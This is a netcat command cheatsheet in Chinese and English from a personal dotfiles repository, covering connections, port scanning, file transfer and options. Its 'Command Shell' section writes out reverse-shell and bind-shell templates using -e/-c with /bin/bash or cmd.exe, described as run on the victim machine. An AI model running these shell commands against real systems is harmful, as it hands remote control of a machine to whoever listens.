##############################################################################
# NC 命令速查表 (Netcat Cheatsheet)
# 瑞士军刀 - 网络工具 (Swiss Army Knife for Networking)
# https://github.com/funnyzak/dotfiles
##############################################################################

# 图例 (Legend):
#   - HOST:      主机名或 IP 地址 (Hostname or IP Address, 例如: google.com, 192.168.1.1)
#   - PORT:      端口号 (Port Number, 例如: 80, 22, 443)
#   - FILE:      本地文件路径 (Local File Path, 例如: /path/to/file.txt)
#   - COMMAND:   要执行的命令 (Command to execute, 例如: /bin/bash)
#   - INTERVAL:  时间间隔 (Time interval, 例如: 1s, 1m, 1h)

##############################################################################
# 基本用法 (Basic Usage)
##############################################################################

nc -v HOST PORT                             # 连接到指定主机和端口 (TCP, verbose)
nc -u -v HOST PORT                          # 连接到指定主机和端口 (UDP, verbose)
nc -l -p PORT                               # 监听指定端口 (TCP, listen mode)
nc -l -u -p PORT                            # 监听指定端口 (UDP, listen mode)

# 提示:
#   - `-v` (verbose):  显示详细输出
#   - `-u` (UDP):      使用 UDP 协议 (默认 TCP)
#   - `-l` (listen):   监听模式 (作为服务器)
#   - `-p PORT`:     指定监听端口 (listen port)

##############################################################################
# 端口扫描 (Port Scanning)
##############################################################################

nc -v -z HOST -n PORT-PORT                  # 扫描指定范围端口 (TCP, zero-I/O, numeric IP)
nc -v -zu HOST -n PORT-PORT                 # 扫描指定范围端口 (UDP, zero-I/O, numeric IP)
nc -v -w SEC -z HOST PORT                    # 设置超时时间扫描端口 (TCP, timeout)

# 提示:
#   - `-z` (zero-I/O): 仅扫描端口，不发送数据
#   - `-n` (numeric-IP):  不进行 DNS 解析，加速扫描
#   - `-w SEC` (timeout): 设置超时秒数 (seconds)

##############################################################################
# 文件传输 (File Transfer)
##############################################################################

# 发送文件 (Sender)
nc -l -p PORT > received_file               # 监听端口接收文件并保存 (服务器端)
nc HOST PORT < FILE                         # 连接到服务器并发送文件 (客户端)

# 接收文件 (Receiver)
nc -l -p PORT > FILE                       # 监听端口接收文件并保存 (接收端)
nc HOST PORT < send_file                    # 连接到服务器并发送文件 (发送端)

# 提示:
#   - 可以使用 `gzip` 或 `tar` 压缩文件后再传输，提高效率
#   - 例如: `tar cz FILE.tar.gz FILE | nc HOST PORT`

##############################################################################
# 命令行 Shell (Command Shell)
##############################################################################

# 反向 Shell (Reverse Shell - 受害者机器执行)
nc -e COMMAND HOST PORT                     # 连接到监听器并执行命令 (不安全，谨慎使用!)
nc -c COMMAND HOST PORT                     # 同上，某些 nc 版本使用 -c

# 绑定 Shell (Bind Shell - 监听机器执行)
nc -l -p PORT -e COMMAND                   # 监听端口，连接后提供 Shell (不安全，谨慎使用!)
nc -l -p PORT -c COMMAND                   # 同上，某些 nc 版本使用 -c

# 提示:
#   - `-e COMMAND` 或 `-c COMMAND`: 执行指定命令 (exec command)
#   - 强烈不建议在生产环境或不信任的网络中使用 Shell 功能，存在安全风险!
#   - 常用命令: `/bin/sh`, `/bin/bash`, `/bin/zsh`, `cmd.exe` (Windows)

##############################################################################
# 高级选项 (Advanced Options)
##############################################################################

nc -k -l -p PORT                           # 长连接监听，连接断开后继续监听 (keep-alive)
nc -t HOST PORT                             # 使用 TCP keep-alive 探测连接
nc -i INTERVAL HOST PORT                     # 设置发送/接收数据间隔时间 (interval)
nc -w SEC HOST PORT                         # 设置连接超时时间 (timeout)
nc -s SRC_ADDR HOST PORT                    # 指定源 IP 地址 (source address)
nc -o FILE -z HOST PORT                     # 将扫描结果输出到文件 (output file)
nc -x PROXY_ADDR:PORT HOST PORT              # 使用 HTTP 或 SOCKS 代理 (proxy)

# 提示:
#   - `-k` (keep-alive):  保持监听状态，即使连接断开
#   - `-t` (tcp-keepalive): 启用 TCP keep-alive 探测
#   - `-i INTERVAL` (interval): 设置发送/接收间隔 (seconds/minutes/hours)
#   - `-s SRC_ADDR` (source):  指定源 IP 地址
#   - `-o FILE` (output):     将输出保存到文件
#   - `-x PROXY` (proxy):      使用代理服务器

##############################################################################
# 实用技巧 (Tips and Tricks)
##############################################################################

# 测试端口是否开放:
#   nc -z -v HOST PORT

# 快速 HTTP 请求:
#   echo -e "GET / HTTP/1.0\nHost: HOST\n\n" | nc HOST 80

# 作为简单的 TCP/UDP 服务器/客户端
#   用于调试网络程序或脚本

# 使用管道组合其他命令
#   例如: `command | nc HOST PORT` 或 `nc -l -p PORT | command`

##############################################################################
# 示例 (Examples)
##############################################################################

# 示例 1:  监听 12345 端口 (TCP), 并将接收到的数据保存到 received.txt
#   nc -l -p 12345 > received.txt

# 示例 2:  连接到 google.com 的 80 端口 (TCP), 发送 HTTP GET 请求
#   echo -e "GET / HTTP/1.0\nHost: google.com\n\n" | nc google.com 80

# 示例 3:  扫描 192.168.1.100 的 1-100 端口 (TCP)
#   nc -v -z 192.168.1.100 -n 1-100

##############################################################################
# 鸣谢 & 更多资源 (Credit & Further Resources)
##############################################################################

# https://linux.die.net/man/1/nc
# https://www.sans.org/security-resources/tcpip/netcat-part-1
# https://null-byte.wonderhowto.com/inspiration/netcat-tutorial-hacker-swiss-army-knife-0132984/

# vim: set ts=4 sw=4 tw=0 et ft=text :
